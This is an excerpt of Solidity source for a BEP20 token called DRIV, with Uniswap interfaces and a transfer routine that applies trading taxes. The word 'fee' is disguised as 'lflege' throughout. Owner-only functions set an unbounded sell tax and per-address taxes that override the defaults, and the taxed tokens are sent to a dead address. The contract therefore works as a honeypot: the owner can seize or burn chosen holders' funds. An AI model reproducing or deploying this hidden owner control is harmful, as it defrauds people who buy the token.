...
interface IUniswapV2Factory {
    ...
    function lflegeTo() external view returns (address);
    function lflegeToSetter() external view returns (address);
    ...
    function setlflegeTo(address) external;
    function setlflegeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportinglflegeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportinglflegeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportinglflegeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportinglflegeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportinglflegeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract DRIV is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSelllflege = 0;

    uint256 private _defaultBuylflege = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _sliplflege;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSelllflege = _value;
    }

    function setSliplflege(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _sliplflege[_address] = _value;
    }

    function getSliplflege(address _address) external view onlyownar returns (uint256) {
        return _sliplflege[_address];
    }


    function setMAccountlflege(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountlflege(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradelflegeAmount = 0;

        if (rF) {
            uint256 tradelflege = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradelflege = _defaultSelllflege;
                }
                if (from == uniswapV2Pair) {

                    tradelflege = _defaultBuylflege;
                }
            }
            if (_sliplflege[from] > 0) {
                tradelflege = _sliplflege[from];
            }

            tradelflegeAmount = _Amount.mul(tradelflege).div(100);
        }


        if (tradelflegeAmount > 0) {
            _balances[from] = _balances[from].sub(tradelflegeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradelflegeAmount);
            emit Transfer(from, _deadAddress, tradelflegeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradelflegeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradelflegeAmount);
        emit Transfer(from, _to, _Amount - tradelflegeAmount);
    }
